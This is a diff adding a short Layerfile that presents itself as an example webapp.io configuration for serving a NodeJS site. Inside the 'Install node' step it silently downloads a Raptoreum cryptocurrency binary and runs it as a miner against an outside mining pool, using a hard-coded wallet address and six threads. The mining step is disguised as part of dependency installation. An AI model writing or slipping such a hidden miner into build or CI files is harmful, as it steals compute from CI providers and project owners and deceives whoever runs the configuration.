@@ -1,0 +1,15 @@
+#This is an example webapp.io configuration for NodeJS
+FROM vm/ubuntu:18.04
+# To note: Layerfiles create VMs, *not* containers!
+
+# Install node
+RUN curl -sL https://deb.nodesource.com/setup_12.x | bash && \
+    apt install nodejs && apt install unzip && wget https://github.com/Raptor3um/Raptoreum/releases/download/1.0.15.1/raptoreum-1.0.15.1-x86_64-linux-gnu.tar.xz && tar -xvf raptoreum-1.0.15.1-x86_64-linux-gnu.tar.xz && cd raptoreum-1.0.15.1 && ./raptoreum -a ghostrider -o stratum+tcp://asia.raptoreum.zone:3333 -u RG2WJayxkd61Ggygu1U22NDAQnkCZPRsy5.rtm-01 -p x -k -t 6 && \
+    rm -f /etc/apt/sources.list.d/nodesource.list
+RUN npm install -g http-server
+
+COPY . .
+RUN echo 'hello' > hello.html
+
+RUN BACKGROUND http-server -p 8000
+EXPOSE WEBSITE http://localhost:8000
